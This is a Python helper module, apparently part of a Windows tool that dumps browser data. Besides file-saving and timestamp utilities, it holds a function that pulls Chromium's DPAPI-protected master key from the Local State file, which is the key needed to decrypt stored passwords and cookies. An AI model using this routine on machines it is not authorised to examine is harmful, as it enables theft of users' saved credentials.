# utils.py
import os
import json
import shutil
import base64
import re
import contextlib
from datetime import datetime, timedelta
import win32crypt
from config import RESET, RED, GREEN, BROWSER_PATHS

def clean_colours(text):
    """Elimina las secuencias de color ANSI de un string."""
    return re.sub(r"\033\[[0-9;]*m", "", text)

def save_to_file(filename, content):
    try:
        content_no_colors = clean_colours(content)
        with open(filename, "w", encoding="utf-8") as f:
            f.write(content_no_colors)
        print(f"{GREEN}[OK] Guardado en '{filename}'{RESET}")
    except Exception as e:
        print(f"{RED}[ERROR] No se pudo guardar en '{filename}': {e}{RESET}")

def display_and_save(content, filename):
    print(content)
    save_to_file(filename, content)

@contextlib.contextmanager
def temporary_copy(original_path, suffix="_copy"):
    temp_path = original_path + suffix
    try:
        shutil.copy2(original_path, temp_path)
        yield temp_path
    finally:
        if os.path.exists(temp_path):
            os.remove(temp_path)

def timestamp_to_datetime(ts):
    """Convierte un timestamp en microsegundos desde 1601 a datetime."""
    if ts == 0:
        return None
    epoch_start = datetime(1601, 1, 1)
    return epoch_start + timedelta(microseconds=ts)

def extract_key_from_local_state(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state_data = json.load(f)
        encrypted_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Elimina el prefijo "DPAPI"
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"{RED}[!] Error obteniendo clave del Local State: {e}{RESET}")
        return None

def get_full_path(browser: str, data_type: str) -> str:
    user_home = os.environ.get("USERPROFILE")
    relative_path = BROWSER_PATHS[browser][data_type]
    return os.path.join(user_home, relative_path)
